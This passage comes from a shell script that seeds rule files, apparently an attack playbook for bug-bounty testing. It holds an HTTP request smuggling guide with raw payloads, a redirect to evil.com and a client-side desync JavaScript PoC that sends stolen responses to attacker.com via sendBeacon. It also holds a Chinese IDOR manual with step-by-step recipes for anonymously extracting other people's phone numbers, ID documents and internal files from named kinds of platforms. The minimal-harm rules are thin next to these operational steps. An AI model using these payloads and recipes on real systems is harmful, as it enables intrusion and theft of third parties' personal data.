2. Back-end sends 301 redirect immediately without consuming body
3. The "GET /admin HTTP/1.1\r\nX: x" remains in socket buffer
4. Next request on this connection is prepended with smuggled bytes
```

### 3.4 Detection

```bash
### Step 1: Find endpoints that respond without consuming body
### Candidates: redirects, 204, static pages serving POST

### Step 2: Send POST with Content-Length larger than actual body
curl -X POST https://target.com/static-page \
  -H "Content-Length: 50" \
  -d "GET /canary HTTP/1.1\r\nHost: target.com\r\n\r\n" \
  --http1.1

### Step 3: Send follow-up request on same connection
### If response matches /canary instead of expected page → CL.0 confirmed
```

### 3.5 Key Differences from CL.TE

| Aspect | CL.TE | CL.0 |
|---|---|---|
| Requires TE header | Yes | No |
| Front/back disagreement | CL vs TE | CL vs "ignore body" |
| Works without chunked support | No | Yes |
| Common targets | Proxies parsing TE | Static servers, redirect endpoints |

---

## 4. FAT GET REQUEST SMUGGLING

### 4.1 Concept

Some reverse proxies allow GET requests with a body (RFC 7230 permits but discourages it). The front-end may forward the body, but the back-end may ignore it for GET requests, leaving body bytes in the buffer.

### 4.2 Payload

```http
GET / HTTP/1.1
Host: target.example
Content-Length: 55

GET /admin HTTP/1.1
Host: target.example
Cookie: admin=true

```

### 4.3 Behavior Matrix

| Proxy/Server | GET Body Behavior |
|---|---|
| Nginx (as proxy) | Forwards body to back-end |
| Apache (as proxy) | Usually forwards body |
| HAProxy | Forwards body by default |
| AWS ALB | May strip body on GET |
| Cloudflare | May strip body on GET |
| Express.js (back-end) | Ignores GET body by default |
| Gunicorn (back-end) | Ignores GET body |
| PHP-FPM | Ignores GET body |

When front-end forwards and back-end ignores → desync.

### 4.4 Combined with Cache

```http
GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 70

GET /admin/delete-user?id=1 HTTP/1.1
Host: target.example
Cookie: admin=true

```

If the proxy caches `/static/app.js` responses, the smuggled request's response may get cached under `/static/app.js`.

---

## 5. REQUEST SMUGGLING → CACHE POISONING CHAIN

### 5.1 The Chain

```
1. Attacker smuggles a request that returns malicious content
2. The smuggled response is associated with a cacheable URL by the front-end
3. Cache stores malicious response under legitimate URL
4. All subsequent users requesting that URL get poisoned content
```

### 5.2 CL.TE → Cache Poisoning Example

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: target.example
Content-Length: 10

x=1
```

**What happens**:
1. Front-end (CL): sends everything as one POST request
2. Back-end (TE): sees POST end at `0\r\n\r\n`, then `GET /static/app.js` as new request
3. Back-end responds to smuggled `GET /static/app.js` — but its response gets matched to the **next legitimate request** on the same connection
4. If next legitimate request is for `/static/app.js` → cache stores the matched response → poisoned

### 5.3 Targeted Poisoning

To control WHAT gets cached, smuggle a request that returns attacker-controlled content:

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 200
Transfer-Encoding: chunked

0

GET /redirect?url=https://evil.com/malicious.js HTTP/1.1
Host: target.example
X-Ignore: x
```

If `/redirect` returns a 302 or 301 to `evil.com`, and the cache stores this for the next request's URL, that URL now redirects to `evil.com` for all users.

### 5.4 Cache Poisoning via Response Queue Misalignment

```
Connection:
  Request A (smuggled) → Response A
  Request B (victim's) → Response B

Cache expects:
  Request B's URL → Response B

Actual:
  Request B's URL → Response A (wrong response)
  
If Response A contains XSS or redirect → cached under Request B's URL
```

---

## 6. CLIENT-SIDE DESYNC (CSD)

### 6.1 Concept

Client-Side Desync exploits browser `fetch()` API behavior to cause desynchronization between the browser and a web server. Unlike server-side smuggling (which poisons a shared connection pool), CSD poisons the **browser's own connection** to the target.

### 6.2 Prerequisites

1. Target server reuses connections (not `Connection: close` on every response)
2. A page on the target (or same-site) where attacker can inject JavaScript
3. The server has an endpoint that doesn't consume the full request body (CL.0-style)

### 6.3 Detailed Flow

```
1. Attacker's JS on victim's browser sends fetch() to target:

   fetch('https://target.com/trigger', {
     method: 'POST',
     mode: 'no-cors',
     credentials: 'include',
     body: 'GET /victim-data HTTP/1.1\r\nHost: target.com\r\n\r\n'
   });

2. Browser sends POST to /trigger with body containing smuggled GET
3. Server responds to POST immediately (ignoring body — CL.0)
4. Smuggled "GET /victim-data" remains in the TCP buffer

5. Attacker's JS sends a follow-up request on same connection:

   fetch('https://target.com/api/me', {
     credentials: 'include'
   });

6. Server processes the leftover "GET /victim-data" instead of "GET /api/me"
7. Response mismatch — browser gets /victim-data response for /api/me request
```

### 6.4 JavaScript PoC Template

```javascript
async function desync(targetUrl, triggerPath, smuggledRequest) {
    const body = smuggledRequest;

    // Step 1: Trigger the desync (CL.0 on trigger endpoint)
    await fetch(targetUrl + triggerPath, {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        body: body
    });

    // Step 2: Follow-up request on (hopefully) same connection
    const response = await fetch(targetUrl + '/api/profile', {
        credentials: 'include'
    });

    // Step 3: Exfiltrate if response is mismatched
    const data = await response.text();
    navigator.sendBeacon('https://attacker.com/log', data);
}

desync(
    'https://target.com',
    '/static/logo.png',  // CL.0-susceptible endpoint
    'GET /admin/users HTTP/1.1\r\nHost: target.com\r\n\r\n'
);
```

### 6.5 CSD Limitations

- Browser may use different connections for subsequent requests → desync fails
- `Connection: close` on server side prevents reuse
- HTTP/2 to single origin may use single connection (actually helps CSD)
- Same-site cookie policies may limit credential inclusion
- Hard to reliably predict connection reuse

### 6.6 CSD via Pause-Based Desync

```
1. Server has a timeout: if request body isn't fully received within N seconds, 
   server sends response and moves on
2. Attacker sends fetch() with:
   - Content-Length: 1000 (large)
   - Actual body: only 50 bytes + smuggled request
3. Server waits, times out, responds to partial request
4. Remaining bytes (smuggled request) stay in buffer
5. Next request on connection processes smuggled bytes
```

---

## 7. CDN / REVERSE PROXY BEHAVIOR MATRIX

### 7.1 CL + TE Handling

| Product | Dual CL+TE | Prefers | Notes |
|---|---|---|---|
| **HAProxy** | Forwards both | TE | Strips CL when TE is present (configurable) |
| **Nginx** | Rejects dual headers (400) | N/A | Strict — hard to smuggle through |
| **Apache (mod_proxy)** | Forwards both | CL | Historic CL.TE source |
| **Cloudflare** | Normalizes | TE | Strips CL when TE present; strong normalization |
| **AWS ALB** | Normalizes | Varies | Has had CL.TE vulns historically (patched) |
| **AWS CloudFront** | Normalizes | CL | May pass TE obfuscation variants |
| **Varnish** | Forwards both | TE | Configurable; default prefers TE |
| **Traefik** | Forwards both | TE | Go `net/http` based; strict chunked parsing |
| **Envoy** | Rejects dual (400) | N/A | Very strict HTTP/1.1 parsing |
| **Caddy** | Go-based; strict | TE | Similar to Envoy strictness |
| **Squid** | Forwards both | CL | Historic TE.CL source |
| **IIS (ARR)** | Forwards both | CL | Historic CL.TE/TE.CL source |

### 7.2 HTTP/2 Downgrade Behavior

| Product | H2→H1 Downgrade | TE Header Handling | CL Passthrough |
|---|---|---|---|
| **HAProxy** | Translates | May pass TE | Passes CL |
| **Nginx** | Translates | Strips TE (usually) | Passes CL |
| **Cloudflare** | Translates | Strips TE | Normalizes CL |
| **AWS ALB** | Translates | Strips TE | Passes CL |
| **AWS CloudFront** | Translates | May pass obfuscated TE | Passes CL |
| **Envoy** | Translates | Strips TE | Strict validation |
| **Traefik** | Translates | May pass TE | Passes CL |

### 7.3 GET Body Handling

| Product | Forwards GET Body | Notes |
|---|---|---|
| HAProxy | Yes | Default behavior |
| Nginx | Yes (as proxy) | Forwards if body present |
| Apache | Yes | Forwards body |
| Cloudflare | Strips | Removes GET body |
| AWS ALB | Depends on version | May strip |
| Varnish | Strips | Removes GET body |
| Envoy | Yes | Forwards |

### 7.4 Connection Reuse Behavior

| Product | Backend Connection Pooling | Impact on Smuggling |
|---|---|---|
| HAProxy | Yes (connection pool) | High risk — smuggled data affects other users |
| Nginx | Yes (keepalive upstream) | High risk |
| Cloudflare | Yes | High risk but strong normalization |
| AWS ALB | Yes | High risk |
| Envoy | Yes | Lower risk (strict parsing) |
| Varnish | Configurable | Depends on `beresp.do_stream` |

---

## 8. TESTING METHODOLOGY

### 8.1 Safe Probe Sequence

```
1. Identify architecture:
   - Check Via, Server, X-Served-By headers
   - Detect CDN (Cloudflare cf-ray, CloudFront x-amz-cf-id, etc.)

2. HTTP version probing:
   - curl --http2 https://target.com -v
   - Check if ALPN negotiation includes h2

3. Time-based desync detection:
   a. CL.TE probe:
      POST / HTTP/1.1
      Content-Length: 4
      Transfer-Encoding: chunked

      1
      A
      0

   b. If response is delayed → back-end is waiting for chunked end → CL.TE likely

4. H2 desync:
   - Send H2 request with content-length: 0 + body containing smuggled prefix
   - Follow with normal request; observe if response matches smuggled path

5. CL.0 detection:
   - Find endpoints returning without consuming body (redirects, static files)
   - Send POST with excess body, follow with normal GET
```

### 8.2 Tools

| Tool | Purpose |
|---|---|
| **Burp Suite HTTP Request Smuggler** | Automated variant scanning |
| **h2csmuggler** (GitHub) | HTTP/2 cleartext smuggling |
| **smuggler.py** (defparam) | CL.TE, TE.CL, TE.TE automation |
| **http2smugl** (GitHub) | H2-specific desync testing |
| **curl** with `--http2` / `--http1.1` | Manual H2/H1 probing |
| **hyper** (Python) | Low-level H2 frame crafting |

### 8.3 Impact Escalation Checklist

```
□ Confirmed desync variant (CL.TE / TE.CL / H2.CL / H2.TE / CL.0)
□ Can smuggle full request? (not just prefix)
□ Connection pooling enabled? (affects other users → critical)
□ Cacheable endpoints exist? (→ cache poisoning)
□ Authenticated endpoints reachable? (→ auth bypass, data theft)
□ Can reflect content in response? (→ stored XSS via cache)
□ Admin/internal paths accessible? (→ privilege escalation)
□ Client-side desync possible? (→ per-user attacks)
```
TECH_HTTP_SMUGGLING_TEST_EOF

seed_rule techniques/http2-attacks-test.md <<'TECH_HTTP2_ATTACKS_TEST_EOF'
# http2-attacks-test（几乎不交）

> HTTP/2 走私教材勿当开场。请求走私走 `http-smuggling-test.md`。
TECH_HTTP2_ATTACKS_TEST_EOF

seed_rule techniques/idor-test.md <<'TECH_IDOR_TEST_EOF'
> 写不写只认 `rules/srcskill/vuln-report-format.md`。进站有会话时最低探针见 `rules/srcskill/dig-scope-workflow.md` §4.2.3（对象图、换 id、哨兵值）；单号用列表/回包里的他人 id，不为第二号磨注册。默认先用读/列表差分证明跨用户·跨租户。写越权仍要测，但**不是**对着别人已有数据改/删。顺序见下「写越权怎么打」。禁止批量改删、禁止真资损。
> 短表指针用标题搜。英文 BOLA 百科已砍；写越权怎么打仍在上半。

## 一、原有知识库

# 越权漏洞（IDOR/权限绕过）测试手册

> **最小伤害：** 默认读/列表差分。写越权要测，按「先加自己的 → 再删自己加的」。不要把「只读」理解成「写 IDOR 不测不报」。

### 写越权怎么打（先加后清）

读差分够闭环就不要写。读不够、要证「能改别人的东西」时：

1. **先测添加。** 用自己的号（或未登录）调创建口，看能不能挂到别人名下 / 别人店 / 别人租户。成功 = 写越权已证。  
2. **再删自己刚加的那一条。** 用同一条接口或对应删除口清掉，别留脏数据。  
3. **不要**去改别人已有订单、改别人密码/角色、删别人原来的地址/券/商品。那些删不干净，也不是最小证伪。  
4. 现场没有创建口、只有改/删现成对象：改一个**自己能改回去**的测试字段，打一次就停。改密 / 改角色 / 改绑按 `rules/srcskill/dig-scope-workflow.md` §4.2.2 和 `authbypass-test.md` **可探**（拿掉旧验看过不过）；过了立刻改回；改不回就停在回包，不要把别人的密、角色、邮箱留下。  
5. 要证资损：只动**自己能改回去的**测试金额/状态，打一次立刻改回。不要真转走生产资金、不要清别人库存、不要把别人已有单改到收不回。**不是**支付/写 IDOR 不测。禁止批量、禁止对着生产主数据试删。本段是最小伤害，**不是**「写 IDOR / 接管 / 加字段不测」。

## 概念区分

- **水平越权**: 同权限级别，访问他人资源（A 访问 B 的订单）
- **垂直越权**: 低权限账户调用高权限接口（普通用户调管理员 API）
- **未授权访问**: 未登录直接访问需认证接口

---

## 测试流程

### Step 1: 找到用户标识参数

在以下位置寻找用户/资源标识：

```
URL 路径:    /api/user/12345/info
URL 参数:    ?userId=12345&orderId=ABC
请求体:      {"uid": 12345, "target_id": "user_abc"}
响应体中:    {"id": 12345, "created_by": 67890}  ← 收集这些 ID
```

**高价值接口特征**:
- 包含 `user`, `account`, `profile`, `order`, `bill`, `message` 的路径
- 响应包含他人的手机号、邮箱、真实姓名、身份证
- 修改类接口: `update`, `edit`, `delete`, `change`

### Step 2: 对象 id（有两号更好，没有也不磨注册）

```
有对照号：账号 A 登录拿 token，账号 B 的资源 ID 做对照。
单号 / 没号：用列表、回包、邻号、`0`/`-1`/空当他人 id（`rules/srcskill/dig-scope-workflow.md` §4.2.3）。禁止为凑第二号去磨注册。
```

### Step 3: 替换标识符测试

```python
# 水平越权测试示例
# 用 A 的 token 访问 B 的资源

import requests

token_a = "Bearer eyJ..."
victim_user_id = "B的用户ID"

# 原始请求（访问自己）
r1 = requests.get(
    "https://target.com/api/user/info",
    params={"userId": "A的ID"},
    headers={"Authorization": token_a}
)

# 越权请求（访问 B）
r2 = requests.get(
    "https://target.com/api/user/info",
    params={"userId": victim_user_id},
    headers={"Authorization": token_a}
)

# 对比响应
print("自己:", r1.json())
print("他人:", r2.json())
# 若 r2 成功返回 B 的数据 → 水平越权
```

### Step 4: 垂直越权测试

```bash
# 用普通用户 token 调用管理员接口
# 先在管理员账号下抓包找到管理接口
ADMIN_ENDPOINT="https://target.com/api/admin/users/list"
USER_TOKEN="普通用户的token"

curl -X GET "$ADMIN_ENDPOINT" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json"

# 200 成功 → 垂直越权
# 403 Forbidden → 有权限控制
```

### Step 5: 未授权访问测试

```bash
# 去掉 Authorization 头直接请求
curl -X GET "https://target.com/api/user/info?userId=12345"

# 或替换为无效 token
curl -X GET "https://target.com/api/user/info?userId=12345" \
  -H "Authorization: Bearer invalid_token_123"
```

---

## 常见绕过技巧

### ID 猜测
```
数字 ID: 尝试 ±1, ±10, 0, -1, 999999
列表上的租户/应用字段：换别人真实 ID 拦了，再试 0 / -1 / 空 / 不传（见下「哨兵租户」）
UUID: 可能从响应或 JS 中获取其他用户 UUID
手机号: 某些接口直接用手机号做标识
```

### 参数污染
```
# 同名参数多次提交
POST /api/user/info?userId=A_ID&userId=B_ID
POST body: userId=A_ID   + URL: ?userId=B_ID
```

### 路径遍历
```
/api/user/A_ID/orders  →  /api/user/B_ID/orders
/api/order/123         →  /api/order/124, 125...
```

### 编码绕过
```
userId=12345         → userId=0x3039（16进制）
userId=12345         → userId=%31%32%33%34%35（URL编码）
```

---

## PoC 证据收集

```
必须保存:
1. 请求完整内容（含 token、headers）
2. 响应完整内容（含受害者数据）
3. 对比截图（A 的正常响应 vs 越权响应）
4. 受害账号 ID 和数据的对应关系证明
```

---

### 密文 ID（短表有指针）

认：改/查地址、订单、资料的请求 id 是一长串密文；回包或列表里能看到明文小数字；JS 有 `RSAUtils` / `JSEncrypt` / `security.js`，或写死 `modulus` + `exponent`。

打：密文不是墙。公钥谁都能用。

1. 先打自己的那条，对照回包里的明文 id  
2. 用同一套前端加密，把相邻数字（明文±1、再往两边走）自己加密  
3. 只换这个密文 id，会话不动  

算成：换过去之后出**别人**的姓名/手机/地址。只证明自己的密文能解回自己的明文 → 不算。

假点：服务端按会话过滤，加密对了也只回自己的；那把钥匙是验签用的，乱加密直接拒。单站没中不删短表这行。钥的实值、某站 `security.js` 链接不进库，现场从当前站 JS 抄。

### 哨兵租户（短表有指针）

认：工单 / 资质 / 会话列表带 `appId`、`tenantId`、`orgId`；回包里有附件 URL（`sign` + `file_name` + 又一个租户字段）。

打（换真实他 ID 是已有水平越权，这里多一枪）：

1. 租户字段试 `0`、`-1`、空串、不传 —— 后端常把哨兵值当成「不过滤」  
2. `total` / 条数相对本租户基线暴涨才算打穿；加大 `pageSize`、翻 `page` 只是把量拉全，**不是洞**  
3. 类型字段（`serviceType` 一类）同样试 `0` / `-1`，可能切到另一套业务单  
4. 列表里的带签下载：原样打开常 403；**`sign` / `file_name` 不动，只把 URL 里的租户改成自己的**（签名没罩住这个字段）。正文在 `file-upload-test.md` 预签名那段  

算成：列表出现他租户的工单正文 / 客服对话，或附件真下到对方证照。主体是跨租户业务读。

假点：`0` 仍只回自己的；换租户下载 403；只有文件通道、没有业务列表。哨兵值没中 → 不删这行，下一站列表过滤照样试。

### 制品库 catalog 不过滤租户（短表有指针）

认：有容器 / 云函数 / 小程序云；能 `docker login` 或看到 Registry / Harbor / `/v2/`。

打：这是列表越权，不是未授权下文件。

1. 用**自己的号**登录制品库  
2. `GET /v2/_catalog`（Harbor 还有项目列表一类接口，同一枪）  
3. 回包仓库名对得上**别人租户** → 再 `/v2/<仓库>/tags/list`，`docker pull` 其中一个  

算成：catalog 里是他租户的私有仓，并且镜像能拉下来（层里是对方的应用/配置）。只证明自己能 login、只能拉官方公开镜像 → 不算。

假点：catalog 只回自己的；列出名字但 pull 403；本来就是公开库。单站没中不删短表这行。

和匿名 fileId 下载、和 OSS 桶策略全开都不是一条：本条是 **登录后 catalog 把全站私有仓交出来**。

### 登录前缀双胞胎（短表有指针）

认：业务 H5 把登录 RPC 写在 `/fapi/d/`（或同类需登录前缀）；同网关另有 `/fapi/n/`（或 n / unlogin / guest）未登录前缀。只打 JS 里的 d 口会看起来整段请登录。

打（不登录）：

1. 对照 d 口应请登录 / 要票  
2. 把 path 里的 `d` 改成 `n`，同一 RPC、同一对象 id 再打  
3. 换邻号；回包证件照 URL 跟着打开  

算成：不登录出他人身份证 / 证件照 / 手机。

假点：n 仍请登录；n 只有公开配置；只有自己刚交的补件。单站没中不删短表这行。

### 数字 RPC 邻 cmd（短表有指针）

认：业务页 JS 调数字 RPC 网关（`/data/{数字}/forward` 一类）。页面往往只写死一个 cmd（发票/广告一类）。邻号可能是另一套内部列表/写口，不要停在写死的那一个。`数字 RPC 网关` 是常见皮，没有这名仍打。

打（不登录）：

1. 抄 JS 里的 forward 地址，把 path 里的数字换成邻号  
2. 先空 `{"req":{}}` 看列表；对照写死 cmd 应是另一套业务  
3. 列表出内部记录再带 id 打邻写口（先假 id / 已空 id）。过了能改回的改回  

算成：内部发布/操作人正文，或字段被改。

假点：邻号仍是同一套公开接口；只出公开软件目录。密钥实值不进库。单站没中不删短表这行。

### 身份域账号 CRUD（短表有指针）

认：同产品业务前端的账号 CRUD 口回登录闸（`AuthFailure.NoLogin`）；另有独立 `*-ids` 身份子域，同一套 `/api/ms-account/` 不要 Cookie。GET list 可能 404，POST 才出数。

打（不登录）：

1. 业务前端同一条 list 对照应登录闸  
2. 改打 ids 子域 `POST /api/ms-account/user/list`，空包/`Offset+Limit` 都试  
3. 通了再 `generate` → `reset-pwd` 只带 Id（不带 Id 应参数错误）→ `delete` 清探测号  

算成：名单里是手机/企业邮箱；能建号、不验旧密改密、按 Ids 删。

假点：只打了业务前端就当没洞；list 出数但 Mail/Phone 全空且写口也闸。单站没中不删短表这行。

### 列表过滤详情不闸（短表有指针）

认：公开列表只出上架/公开；详情、hidden、tab、预览/导出用同一个业务 id。或列表有可见性查询参，默认把隐藏滤掉。或列表要登录/空包，详情只要数字 id + 业务键（workid 一类）。或对外详情把联系人/手机置空，审核/approval 详情用同一个业务 id。或文档 CMS 前端写死公开 `area` / `端` / `channel`，API 不鉴权。或对外搜索口有素材类型参（`materialType` / `tab`）默认公开值。或入驻/审核 query 只带业务 id 默认空壳。或同产品全量列表口不带可见性参，行里就带着 unpublished/offline 详情正文，公开搜索和橱窗详情仍闸。或浏览页/目录写访客请登录，同站 search API 未登录仍出内部/专有文档正文。

打（不登录）：

1. 记下公开列表 id；列表没有的 id 丢给详情 / hidden / tab；详情 403 再跟预览 / 导出  
2. 列表口自己加 `status=hidden` / `all` / `private`（或同类可见性参）。对照：不带参列表空或只有公开；同一 id 打详情仍「没有权限」也别停——闸可能只套在详情上  
3. **这条列表口 401 / 要登录 / 空包别停。** 换同产品另一条 guest 查询，看回包 `hidden` / `is_public` / `isHidden`。公开 contents 404 再打 hidden/contents 同一 id。详情只要数字 id + 业务键仍打。`is_secret=1` 仍出全文别停在标题。  
4. **详情 200 且 JSON 已写尚未发布 / 要登录 / `canAnswer=false`，别停。** 看同包 `savedConfigDraft` / 同类草稿字段有没有未发布正文。拦截文案和草稿可以在同一份 JSON。  
5. **对外详情 contact / mobile / email 置空别停。** 同一 id 再打审核 / approval / audit 详情；闸可能只套在对外展示口。  
6. **作品/项目有 `period=edit|publish`（或同类状态参）别停在 publish。** 不登录打内容口 `period=edit`。对照：同一 id 的 publish 说不存在/已删除，info 挡「没权读别人的」。edit 仍出正文才算。  
7. **JSON 列表筛选项 null / 缺字段报 Unknown / 参数错误，别停。** 把该字段改成空数组 `[]` 再打。后端常把空数组当成「不过滤」，匿名出下架 / 全表；缺参或 null 反而拦。对照：`null` 或删掉该键应报错或空，`[]` 才出已下架正文。
8. **文档 CMS 前端写死公开 `area` / `端` / `channel`，别停在默认值。** 未登录把参改成内部区（常见 1 vs 2、oa vs public）。对照：默认公开列表没有的接入/加固/内网算法正文，改参后列表或详情出来才算。  
9. **对外搜索口有 `materialType`（或同类素材类型）别停在前端默认公开值。** 对照公开规范/橱窗类型，改成内部市场素材、营销规范一类。path 缺 `/v2/` 报 `auth failed` 别停，按前端替换规则补上再打。算成：SSO 墙后、`isLimitAuth=1` 的内部物料名单/文件直链。  
10. **自助入驻/审核 query 只带门店号/业务 id 出空壳别停。** 加上审核状态=已通过（`baseInfoStatus` 一类）再打。回包 `uid` 立刻跟邮箱/联系人口。对照：不带状态应空壳或没手机。  

11. **证照图 JSON 没有 idNo 别停。** 详情出商标注册证 / 执照扫描件就打开看：注册人行常把身份证号拼在姓名后面。图上对得上人就算，不要只扫 JSON 字段。  
12. **导出任务列表 `pageNum=0` 空别当没数据。** 改 `pageNum=1` 再打，常能出全站别人的导出。抄 `fileName` / key 打 download。
13. **详情 telephone / 手机字段打码别停。** 未发布详情的 `requirement` / 备注 / 自由文本里常把完整 11 位手机写进去，接口只剥了结构化字段。
14. **全量列表口不带可见性参也打。** 行里直接看 unpublished / offline / rejected 详情正文。对照：公开搜索该 id total=0、人打开的橱窗详情说不存在。别只打公开搜索和详情页就当没洞。
15. **浏览页/目录写访客请登录别停。** 同站 search API（Keyword+Page+PageSize）未登录仍可能出内部/专有文档正文和详情 URL。详情页 JSON `isLogined=false` 仍出全文别停。对照：人打开的目录页写着访客请登录才能看。
16. **详情口已补 / 项目不存在别停。** 同站 visit-log / 埋点 / doc-add-visit-log 只要数字篇号仍可能出 OA/内部全文。对照：原详情口同一业务 id 应已拦。
17. **目录写访客请登录才能看/下别停。** 同站文件列表口（`getHomeCosFileList` 一类，`solution_id`+`version_id`+`folder_id=0`）未登录仍可能出培训视频/白皮书/手册名单。列表 `file_id` 丢权限口（`getFilePrivilege`）看 `PreviewUrl` / 带签下载。对照：人打开的目录页写着访客请登录才能看、才能下。
18. **内容 SPA 按 `location.host` 正则选 Color/网关域，别打错 TLD。** JS 里常见 `.*\\.jd\\.hk` → `内容网关域`；打成 `打错的内容网关域` 会当没口。打法仍是不登录楼层 queryContents + previewContentDetail。对照公开详情应不存在/1414。
19. **文档站公开 itemList / 目录只出对外产品别停。** 未登录把 `item`（或同类项目号）改成纯数字自增打详情/page。正文可能是压缩 markdown，按前端同一套解开。对照：公开 itemList 没有的「对内/未对外/不对外」库才算。
20. **收集表/问卷填报详情 JSON 的 relative / 关联表挂着答卷 sheet 别停。** 人打开的是填报页，答卷表可能另有 id。不登录打答卷表详情/opendoc。对照：填报页只是题目，答卷表才出身份证/手机单元格。
21. **内容预览口只要数字 contentId，回包 `isDelete=1` / 已删除 / 未发布别停。** 对照公开橱窗应没有这篇。出整页 H5 或编辑器 JSON 才算，不要只看标题。

算成：未公开业务正文从列表出来（不是公开橱窗标题）；或他主体手机 / 证件；或证照图注册人行印着身份证号；或未发布/已下架作品源码正文。

假点：加了可见性参仍只出公开稿；只有标题没有正文；列表 401 就当没洞；edit 和 publish 出同一份已上架正文；空数组和缺参出同一份上架稿；`materialType` 仍只出公开橱窗；只带业务 id 出空壳就当没洞、没再加审核状态；只打了公开搜索/橱窗详情就当没洞；浏览页写请登录就当没洞；数字 item 仍是那几本公开文档。打错 Color 域当没口不是假点。单站没中不删短表这行。

### 过网关无需鉴权头（短表有指针）

认：物流 / 开放网关（`lop-proxy` 一类）前端 JS 写死 `Auth-Control: no-auth` + `LOP-DN`（业务域）。其它业务口请登录，带着这组头名单/运单口仍出数。

打（不登录）：

1. 抄 JS 里的 `LOP-DN` 和 `Auth-Control: no-auth`（或同类过网关鉴权头）  
2. 空翻页打站点/名单口；再换可枚举 `siteId` 打运单/详情  
3. 对照：不带头应请登录或 Host 未注册  

算成：出他人手机 / 住址 / 站点联系人，不是公开轨迹。

假点：头过了业务仍请登录；只有公开轨迹没有 PII。单站没中不删短表这行。

### 匿名会话读报名表（短表有指针）

认：BaaS 匿名 session；列表口不验管理员。页面写死几个管理员 ID，后台跳登录。Appwrite / Weavefox / TablesDB 是常见皮，没有这名仍打。前端常见 `Client().setEndpoint`、`X-Appwrite-Project`、`POST /v1/account/sessions/anonymous`；报名/活动表走 `tablesDB.listRows`。

打（不登录、不要管理员号）：

1. 无 Cookie 先打 `GET /v1/tablesdb/{db}/tables/{table}/rows` —— 基线应是 `total=0` / 空 rows（系统其实会拦游客）  
2. `POST /v1/account/sessions/anonymous` body `{}`，头带同一 `X-Appwrite-Project`，拿 `Set-Cookie: a_session_…`  
3. 带着这条匿名会话再打同一 listRows  

算成：匿名会话后 `total` 相对空会话暴涨，rows 里是**别人**的手机 / 邮箱 / 报名正文。管理员白名单只写在浏览器里、没套到列表口。

假点：无会话已经是全表（那是完全无鉴权，另记）；匿名会话仍空或只有自己刚填的一条；DELETE 别人行 401 只说明写没开，读仍算；公开运营展示名单。单站没中不删短表这行。

和「无 Project key、连匿名会话都不用就能 CRUD」不是同一枪：本条关键是 **匿名 session 被当成已登录，且不验管理员**。

### 云开发匿名用户表（短表有指针）

认：云开发开了匿名登录；有低代码数据源函数。控制台或前端能抄到环境 id。不是短表已有的 proxy `targetUrl`，也不是 BaaS `sessions/anonymous`。

打（不登录）：

1. `POST https://{envId}.api.云开发网关/auth/v1/signin/anonymously`，头 `x-device-id`，body `{}`，拿 JWT  
2. `POST /v1/functions/lowcode-datasource`，`Authorization: Bearer` 那张票，body `dataSourceName=sys_user`、`methodName=wedaGetRecords`（`getRecords` 同源）  
3. 对照：同一网关 `GET /auth/v1/user/query` 应拦匿名；数据源名 `users` 常行权限失败，**不要停**，`sys_user` 才是系统用户表  
4. HTTP 网关（常见 `/web?env=`）回 `LOGIN_TYPE_DISABLED` **别停**：改 `POST /web?env=`，`auth.signInAnonymously` → `auth.getUserInfo` 拿 `jwt;expire`（**不要去掉分号后缀**）→ `functions.invokeFunction`，同样打 `sys_user` / `wedaGetRecords`  
5. 旧 HS256 票丢 `/v1/functions` 报 `KID_INVALID` → 这枪没成，换第 4 步网关票，不要当「数据源不存在」  
6. `sys_user` 行权限失败 **别停**：同一张 `/web` 匿名票改 `database.countDocument` / `database.queryDocument`，`collectionName=users`（互联登录落库的用户表，不是数据源名 `users`）  

算成：records 里是**他人**手机 / 邮箱 / uin / 超管标记，不是自己刚匿名建的空号。

假点：行权限拒匿名且 `/web` users 集合也空；数据源不存在；只出演示 todo/sales；旧 HS256 票 `KID_INVALID` 当没洞。HTTP 网关 `LOGIN_TYPE_DISABLED` 不是假点。数据源名 `users` 失败不算假点。单站没中不删短表这行。密钥实值、某次 JWT 不进库。

### 详情抄 openid 再打信箱（短表有指针）

认：招募/指定用户详情带 `specifyUsers` 或 openid；H5 写死 SHA256 请求签名；或邀请页地址已有 `?openid=`。

打（不登录）：

1. 调详情抄 openid  
2. 钥算 Signature 再打 `/msg/message/list/`  
3. URL 上已有 openid 则再打无签名的 `get_invite_code` / `count` / `detail`，名单 `uid` 可再填回去  

算成：换 openid 信箱或邀请码/名单变，出现对方积分过期通知或打码手机昵称。

假点：列表人人一样只是全站广播；接口要真登录/签名；假 openid 没有邀请码；公开运营名单。单站没中不删短表这行。

### 资料库 nodeId 未授权读全文（短表有指针）

认：发布页 conversation-data 的 artifactMap 有资料库 `nodeId`；主站 `/space/d/` 要登录。

打（不登录）：打发布域 `POST /space/api/page/share/query/pagechunk`（body=`pageId=nodeId`）。对照：分享页自己的 pageId 应是「不可分享」。

算成：拉到他人文档全文（标题/角色卡/大纲，`role=editor`）。

假点：只读到已发布 HTML 快照；pagechunk 对资料库也 12607；正文已在对话快照里。单站没中不删短表这行。

### 匿名 CSRF 头读详情（短表有指针）

认：匿名 CSRF/临时 token 口直接出 token；业务详情只验这个头不验登录；query 的数字 id 和回包 `data.id` 可以不是同一个号。不是助手 `GetHistoryList` 可选登录头（那枪见「助手历史未授权读他人任务」）。

打（不登录）：

1. 打 csrf/token 口拿头  
2. 详情换数字 id（1、2、13），**query id 对不上回包 id 别停**  
3. 对照：不带头应失败；不存在的 id 应「不存在」

算成：未上架/测试训练脚本或内部会话正文（cardMap/对白全文，不是标题）。

假点：只有公开广场；token 过了仍空。单站没中不删短表这行。

### 自定义身份头当会话（短表有指针）

认：管理后台 SPA 请求拦截器把自定义头（`User-Id` / `employeeId` / `X-User-Id` 一类）当登录身份，不要 Cookie。未登录名单口往往只出数字员工/BD 号，没有手机。

打（不登录）：

1. 抄 JS 拦截器里的头名  
2. 未登录打名单（空参/总部筛）。只有数字号**别停**  
3. 把头换成这个号打当前人信息口。对照：不带头或填 `1` 应查空  

算成：出他人姓名+11 位手机。

假点：头过了仍空；名单已经出手机（那是另一条）。单站没中不删短表这行。

和「匿名 CSRF 头读详情」不是一条：那条是临时 token 头，这条是**身份数字号进头**。和「入驻 H5 空参出招商通讯录」也不是一条：那条类目空着整表出手机，这条名单没手机还要再把头当身份打一枪。

### 客户详情口还吃 phone（短表有指针）

